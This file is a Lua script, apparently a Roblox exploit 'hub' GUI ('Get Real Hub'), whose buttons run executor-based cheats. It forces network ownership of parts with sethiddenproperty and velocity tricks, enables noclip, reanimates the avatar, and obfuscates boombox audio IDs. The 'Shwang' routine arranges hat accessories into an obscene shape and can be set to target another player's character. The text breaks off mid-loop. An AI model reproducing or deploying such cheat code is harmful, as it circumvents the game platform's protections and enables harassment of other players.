-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local Label = Instance.new("TextLabel")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local boombox = Instance.new("Frame")
local Frame_3 = Instance.new("Frame")
local X = Instance.new("TextButton")
local Label_2 = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local input = Instance.new("TextBox")
local Obfuscate = Instance.new("TextButton")
local output = Instance.new("TextBox")
local TextLabel_3 = Instance.new("TextLabel")
local play = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0787172019, 0, 0.66393441, 0)
Frame.Size = UDim2.new(0, 362, 0, 247)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.937462032, 0, -3.31997871e-05, 0)
TextButton.Size = UDim2.new(0, 24, 0, 25)
TextButton.ZIndex = 3
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0200874805, 0, -0.00408169534, 0)
TextLabel.Size = UDim2.new(0, 95, 0, 25)
TextLabel.ZIndex = 3
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Get Real Hub | By ant"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

Label.Name = "Label"
Label.Parent = Frame
Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1.000
Label.Position = UDim2.new(0.937462032, 0, -3.31997871e-05, 0)
Label.Size = UDim2.new(0, 24, 0, 25)
Label.ZIndex = 3
Label.Font = Enum.Font.SourceSans
Label.Text = "X"
Label.TextColor3 = Color3.fromRGB(255, 0, 4)
Label.TextScaled = true
Label.TextSize = 14.000
Label.TextWrapped = true

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.731214941, 0, 0, 0)
TextButton_2.Size = UDim2.new(0, 66, 0, 24)
TextButton_2.ZIndex = 3
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Net"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 20.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0771086514, 0, 0.141700417, 0)
TextButton_3.Size = UDim2.new(0, 91, 0, 30)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Among Us"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 20.000
TextButton_3.TextWrapped = true

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.685749829, 0, 0.141700417, 0)
TextButton_4.Size = UDim2.new(0, 91, 0, 30)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Shwang"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 20.000
TextButton_4.TextWrapped = true

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.516335249, 0, 0.0040485831, 0)
TextButton_5.Size = UDim2.new(0, 77, 0, 24)
TextButton_5.ZIndex = 3
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Anim"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 20.000
TextButton_5.TextWrapped = true

TextButton_6.Parent = Frame
TextButton_6.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
TextButton_6.BorderSizePixel = 0
TextButton_6.Position = UDim2.new(0.379119992, 0, 0.141700417, 0)
TextButton_6.Size = UDim2.new(0, 91, 0, 30)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Boombox Util"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 20.000
TextButton_6.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0, 0, -3.31121882e-05, 0)
Frame_2.Size = UDim2.new(0, 362, 0, 26)
Frame_2.ZIndex = 2

boombox.Name = "boombox"
boombox.Parent = ScreenGui
boombox.Active = true
boombox.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
boombox.BorderSizePixel = 0
boombox.Position = UDim2.new(0.00803267956, 0, 0.232355475, 0)
boombox.Size = UDim2.new(0, 320, 0, 337)
boombox.Visible = false

Frame_3.Parent = boombox
Frame_3.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0, 0, -3.31437186e-05, 0)
Frame_3.Size = UDim2.new(0, 320, 0, 26)

X.Name = "X"
X.Parent = boombox
X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
X.BackgroundTransparency = 1.000
X.Position = UDim2.new(0.937462032, 0, -3.31997871e-05, 0)
X.Size = UDim2.new(0, 24, 0, 25)
X.Font = Enum.Font.SourceSans
X.Text = ""
X.TextColor3 = Color3.fromRGB(0, 0, 0)
X.TextSize = 14.000

Label_2.Name = "Label"
Label_2.Parent = boombox
Label_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label_2.BackgroundTransparency = 1.000
Label_2.Position = UDim2.new(0.937462032, 0, -3.31997871e-05, 0)
Label_2.Size = UDim2.new(0, 24, 0, 25)
Label_2.Font = Enum.Font.SourceSans
Label_2.Text = "X"
Label_2.TextColor3 = Color3.fromRGB(255, 0, 4)
Label_2.TextScaled = true
Label_2.TextSize = 14.000
Label_2.TextWrapped = true

TextLabel_2.Parent = boombox
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.00201196061, 0, -3.31712799e-05, 0)
TextLabel_2.Size = UDim2.new(0, 186, 0, 25)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "BoomBox Utilities"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

input.Name = "input"
input.Parent = boombox
input.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
input.Position = UDim2.new(0.0420420393, 0, 0.116487056, 0)
input.Size = UDim2.new(0, 297, 0, 24)
input.Font = Enum.Font.Ubuntu
input.Text = ""
input.TextColor3 = Color3.fromRGB(0, 0, 0)
input.TextSize = 14.000

Obfuscate.Name = "Obfuscate"
Obfuscate.Parent = boombox
Obfuscate.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
Obfuscate.BorderSizePixel = 0
Obfuscate.Position = UDim2.new(0.0432647616, 0, 0.210976869, 0)
Obfuscate.Size = UDim2.new(0, 297, 0, 30)
Obfuscate.Font = Enum.Font.SourceSans
Obfuscate.Text = "Obfuscate"
Obfuscate.TextColor3 = Color3.fromRGB(0, 0, 0)
Obfuscate.TextScaled = true
Obfuscate.TextSize = 20.000
Obfuscate.TextWrapped = true

output.Name = "output"
output.Parent = boombox
output.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
output.Position = UDim2.new(0.0420420431, 0, 0.430534005, 0)
output.Size = UDim2.new(0, 297, 0, 108)
output.ClearTextOnFocus = false
output.Font = Enum.Font.Ubuntu
output.Text = ""
output.TextColor3 = Color3.fromRGB(0, 0, 0)
output.TextSize = 14.000
output.TextWrapped = true

TextLabel_3.Parent = boombox
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0430330783, 0, 0.332011968, 0)
TextLabel_3.Size = UDim2.new(0, 187, 0, 25)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Obfuscated ID"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

play.Name = "play"
play.Parent = boombox
play.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
play.BorderSizePixel = 0
play.Position = UDim2.new(0.0432647616, 0, 0.772230446, 0)
play.Size = UDim2.new(0, 297, 0, 30)
play.Font = Enum.Font.SourceSans
play.Text = "Play Obfuscated ID"
play.TextColor3 = Color3.fromRGB(0, 0, 0)
play.TextScaled = true
play.TextSize = 20.000
play.TextWrapped = true

-- Scripts:

local function NIJTJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Remove()
	end)
	
end
coroutine.wrap(NIJTJ_fake_script)()
local function ATSNJB_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(0,-30,0)
				end)
			end
		end
	end)
	
end
coroutine.wrap(ATSNJB_fake_script)()
local function YIAJYSR_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
	
		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(0,-30,0)
				end)
			end
		end
	
		char = game.Players.localPlayer.Character
	
		char.Torso["Left Shoulder"]:Remove()
		att0 = Instance.new("Attachment",char["Left Arm"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0.5, -0.3, -1)
		att1 = Instance.new("Attachment",char["Torso"]) 
		ap = Instance.new("AlignPosition",char["Left Arm"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Left Arm"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
		--made by ant :trollage:
		char.Torso["Right Shoulder"]:Remove()
		att0 = Instance.new("Attachment",char["Right Arm"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(-0.5, -0.3, -1)
		att1 = Instance.new("Attachment",char["Torso"]) 
		ap = Instance.new("AlignPosition",char["Right Arm"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Right Arm"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		--char["Left Leg"].Position = char["Left Leg"].Position + Vector3.new(0, 1, 0)
		--char["Right Leg"].Position = char["Right Leg"].Position + Vector3.new(0, 1, 0)
	
		char.Humanoid.HipHeight = -1
		char.Head.Mesh:Remove()
		char.Head.face:Remove()
	
		char = game.Players.localPlayer.Character
	
		char["Pink Hair"].Handle.AccessoryWeld:Destroy() 
		char["Pink Hair"].Handle.Mesh:Remove()
		att0 = Instance.new("Attachment",char["Pink Hair"].Handle) 
		att0.Orientation = Vector3.new(0, 90, 0)
		att0.Position = Vector3.new(0.5, -1, 0)
		att1 = Instance.new("Attachment",char["Torso"]) 
		ap = Instance.new("AlignPosition",char["Pink Hair"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Pink Hair"].Handle) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
	end)
	
end
coroutine.wrap(YIAJYSR_fake_script)()
local function ZDCN_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	wait(2)
	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(ZDCN_fake_script)()
local function CIQTH_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
	
	
		if game.PlaceId == 2228128339 then
			r15 = true
		end
		--set charac to give someone else the hotdog
		--forceplayer when true makes you teleport to the end of the hotdog when you pick the charac
		--↓↓↓↓ settings
		charac = nil
		forceplayer = false
		--↑↑↑↑ settings
	
		--dont worry about the rest of the code
		if charac == nil then
			forced = game.Players.LocalPlayer.Character
		else
			forced = game.Players[charac].Character
		end
	
	
		if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
			r15 = true
		else
			r6 = true
		end
	
	
		if forced:FindFirstChild("UpperTorso") then
			sustorso = forced.UpperTorso
		else
			sustorso = forced.Torso
		end
		-- set to this for charac to tp you to end
	
		-- script made antgame11 on v3rm <3
	
		char = game.Players.LocalPlayer.Character
		char.Shirt:Remove()
		char.Pants:Remove()
		local sus = char:FindFirstChild("InternationalFedora")
		sus.Name = "real"
		char["real"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["real"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["real"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0.6, 1)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["real"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["real"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		local sus = char:FindFirstChild("InternationalFedora")
		sus.Name = "real1"
		char["real1"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["real1"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["real1"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0.6, 2)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["real1"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["real1"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		local sus = char:FindFirstChild("InternationalFedora")
		sus.Name = "real2"
		char["real2"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["real2"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["real2"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0.6, 3)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["real2"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["real2"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		local sus = char:FindFirstChild("InternationalFedora")
		sus.Name = "real3"
		char["real3"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["real3"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["real3"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0.6, 4)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["real3"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["real3"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		local sus = char:FindFirstChild("International Fedora")
		sus.Name = "real4"
		char["real4"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["real4"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["real4"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0.6, 5)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["real4"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["real4"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
	
		local sus = char:FindFirstChild("International Fedora")
		sus.Name = "ballsbro1"
		char["ballsbro1"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["ballsbro1"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["ballsbro1"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0.7, 1.1, 1)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["ballsbro1"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["ballsbro1"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
		local sus = char:FindFirstChild("International Fedora")
		sus.Name = "ballsbro2"
		char["ballsbro2"].Handle.AccessoryWeld:Destroy()
		if r15 == true then else
			char["ballsbro2"].Handle.SpecialMesh:Destroy()
		end
		att0 = Instance.new("Attachment",char["ballsbro2"].Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(-0.7, 1.1, 1)
		att1 = Instance.new("Attachment",sustorso)
		ap = Instance.new("AlignPosition",char["ballsbro2"].Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true
		ao = Instance.new("AlignOrientation",char["ballsbro2"].Handle)
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
		if charac == nil then else
			if forceplayer == true then
				att0 = Instance.new("Attachment",char["HumanoidRootPart"])
				att0.Orientation = Vector3.new(0, 0, 0)
				att0.Position = Vector3.new(0, 0, 5.5)
				att1 = Instance.new("Attachment",sustorso)
				ap = Instance.new("AlignPosition",char["HumanoidRootPart"])
				ap.Attachment0 = att0
				ap.Attachment1 = att1
				ap.RigidityEnabled = true
				ao = Instance.new("AlignOrientation",char["HumanoidRootPart"])
				ao.Attachment0 = att0
				ao.Attachment1 = att1
				ao.RigidityEnabled = true
			end
		end
	
	end)
	
end
coroutine.wrap(CIQTH_fake_script)()
local function JBCWUGR_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		-- when you reset make sure to re-execute this or just make this execute in a loop
		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(20,-30,20)
				end)
			end
		end
		sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",10000)
		sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",10000)
		local speaker = game.Players.LocalPlayer
		Clip = false
		local function NoclipLoop()
			if Clip == false and speaker.Character ~= nil then
				for _, child in pairs(speaker.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		--Converted with ttyyuu12345's model to script plugin v4
		function sandbox(var,func)
			local env = getfenv(func)
			local newenv = setmetatable({},{
				__index = function(self,k)
					if k=="script" then
						return var
					else
						return env[k]
					end
				end,
			})
			setfenv(func,newenv)
			return func
		end
		cors = {}
		mas = Instance.new("Model",game:GetService("Lighting"))
		Model0 = Instance.new("Model")
		Part1 = Instance.new("Part")
		Motor6D2 = Instance.new("Motor6D")
		Part3 = Instance.new("Part")
		Motor6D4 = Instance.new("Motor6D")
		Motor6D5 = Instance.new("Motor6D")
		Motor6D6 = Instance.new("Motor6D")
		Motor6D7 = Instance.new("Motor6D")
		Motor6D8 = Instance.new("Motor6D")
		Part9 = Instance.new("Part")
		Part10 = Instance.new("Part")
		Part11 = Instance.new("Part")
		Part12 = Instance.new("Part")
		Part13 = Instance.new("Part")
		SpecialMesh14 = Instance.new("SpecialMesh")
		Humanoid15 = Instance.new("Humanoid")
		Model0.Name = "Dummy"
		Model0.Parent = mas
		Model0.PrimaryPart = Part1
		Part1.Name = "HumanoidRootPart"
		Part1.Parent = Model0
		Part1.CFrame = CFrame.new(3.22662354, 8.647089, -16.7855225, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part1.Position = Vector3.new(3.22662353515625, 8.647089004516602, -16.7855224609375)
		Part1.Transparency = 0.5
		Part1.Size = Vector3.new(2, 2, 1)
		Part1.BottomSurface = Enum.SurfaceType.Smooth
		Part1.CanCollide = false
		Part1.TopSurface = Enum.SurfaceType.Smooth
		Motor6D2.Name = "Root Hip"
		Motor6D2.Parent = Part1
		Motor6D2.MaxVelocity = 0.10000000149011612
		Motor6D2.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		Motor6D2.C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		Motor6D2.Part0 = Part1
		Motor6D2.Part1 = Part3
		Motor6D2.part1 = Part3
		Part3.Name = "Torso"
		Part3.Parent = Model0
		Part3.CFrame = CFrame.new(3.22662354, 8.647089, -16.7855225, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part3.Position = Vector3.new(3.22662353515625, 8.647089004516602, -16.7855224609375)
		Part3.Size = Vector3.new(2, 2, 1)
		Part3.BottomSurface = Enum.SurfaceType.Smooth
		Part3.CanCollide = false
		Part3.TopSurface = Enum.SurfaceType.Smooth
		Motor6D4.Name = "Left Hip"
		Motor6D4.Parent = Part3
		Motor6D4.MaxVelocity = 0.10000000149011612
		Motor6D4.C0 = CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08)
		Motor6D4.C1 = CFrame.new(-0.5, 1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08)
		Motor6D4.Part0 = Part3
		Motor6D4.Part1 = Part9
		Motor6D4.part1 = Part9
		Motor6D5.Name = "Right Hip"
		Motor6D5.Parent = Part3
		Motor6D5.MaxVelocity = 0.10000000149011612
		Motor6D5.C0 = CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08)
		Motor6D5.C1 = CFrame.new(0.5, 1, 0, -4.37113883e-08, 0, 1, 0, 0.99999994, 0, -1, 0, -4.37113883e-08)
		Motor6D5.Part0 = Part3
		Motor6D5.Part1 = Part10
		Motor6D5.part1 = Part10
		Motor6D6.Name = "Left Shoulder"
		Motor6D6.Parent = Part3
		Motor6D6.MaxVelocity = 0.10000000149011612
		Motor6D6.C0 = CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08)
		Motor6D6.C1 = CFrame.new(0.5, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08)
		Motor6D6.Part0 = Part3
		Motor6D6.Part1 = Part11
		Motor6D6.part1 = Part11
		Motor6D7.Name = "Right Shoulder"
		Motor6D7.Parent = Part3
		Motor6D7.MaxVelocity = 0.10000000149011612
		Motor6D7.C0 = CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08)
		Motor6D7.C1 = CFrame.new(-0.5, 0.5, 0, -4.37113883e-08, 0, 1, 0, 0.99999994, 0, -1, 0, -4.37113883e-08)
		Motor6D7.Part0 = Part3
		Motor6D7.Part1 = Part12
		Motor6D7.part1 = Part12
		Motor6D8.Name = "Neck"
		Motor6D8.Parent = Part3
		Motor6D8.MaxVelocity = 0.10000000149011612
		Motor6D8.C0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		Motor6D8.C1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		Motor6D8.Part0 = Part3
		Motor6D8.Part1 = Part13
		Motor6D8.part1 = Part13
		Part9.Name = "Left Leg"
		Part9.Parent = Model0
		Part9.CFrame = CFrame.new(2.72662354, 6.647089, -16.7855225, 1, 0, 0, 0, 0.999999881, 0, 0, 0, 1)
		Part9.Position = Vector3.new(2.72662353515625, 6.647089004516602, -16.7855224609375)
		Part9.Size = Vector3.new(1, 2, 1)
		Part9.BottomSurface = Enum.SurfaceType.Smooth
		Part9.CanCollide = false
		Part9.TopSurface = Enum.SurfaceType.Smooth
		Part10.Name = "Right Leg"
		Part10.Parent = Model0
		Part10.CFrame = CFrame.new(3.72662354, 6.647089, -16.7855225, 1, 0, 0, 0, 0.999999881, 0, 0, 0, 1)
		Part10.Position = Vector3.new(3.72662353515625, 6.647089004516602, -16.7855224609375)
		Part10.Size = Vector3.new(1, 2, 1)
		Part10.BottomSurface = Enum.SurfaceType.Smooth
		Part10.CanCollide = false
		Part10.TopSurface = Enum.SurfaceType.Smooth
		Part11.Name = "Left Arm"
		Part11.Parent = Model0
		Part11.CFrame = CFrame.new(1.72662354, 8.647089, -16.7855225, 1, 0, 0, 0, 0.999999881, 0, 0, 0, 1)
		Part11.Position = Vector3.new(1.72662353515625, 8.647089004516602, -16.7855224609375)
		Part11.Size = Vector3.new(1, 2, 1)
		Part11.BottomSurface = Enum.SurfaceType.Smooth
		Part11.CanCollide = false
		Part11.TopSurface = Enum.SurfaceType.Smooth
		Part12.Name = "Right Arm"
		Part12.Parent = Model0
		Part12.CFrame = CFrame.new(4.72662354, 8.647089, -16.7855225, 1, 0, 0, 0, 0.999999881, 0, 0, 0, 1)
		Part12.Position = Vector3.new(4.72662353515625, 8.647089004516602, -16.7855224609375)
		Part12.Size = Vector3.new(1, 2, 1)
		Part12.BottomSurface = Enum.SurfaceType.Smooth
		Part12.CanCollide = false
		Part12.TopSurface = Enum.SurfaceType.Smooth
		Part13.Name = "Head"
		Part13.Parent = Model0
		Part13.CFrame = CFrame.new(3.22662354, 10.147089, -16.7855225, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part13.Position = Vector3.new(3.22662353515625, 10.147089004516602, -16.7855224609375)
		Part13.Size = Vector3.new(2, 1, 1)
		Part13.BottomSurface = Enum.SurfaceType.Smooth
		Part13.CanCollide = false
		Part13.TopSurface = Enum.SurfaceType.Smooth
		SpecialMesh14.Parent = Part13
		SpecialMesh14.Scale = Vector3.new(1.25, 1.25, 1.25)
		Humanoid15.Parent = Model0
		Humanoid15.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		Humanoid15.LeftLeg = Part9
		Humanoid15.NameOcclusion = Enum.NameOcclusion.NoOcclusion
		Humanoid15.RightLeg = Part10
		Humanoid15.Torso = Part1
		for i,v in pairs(mas:GetChildren()) do
			v.Parent = workspace
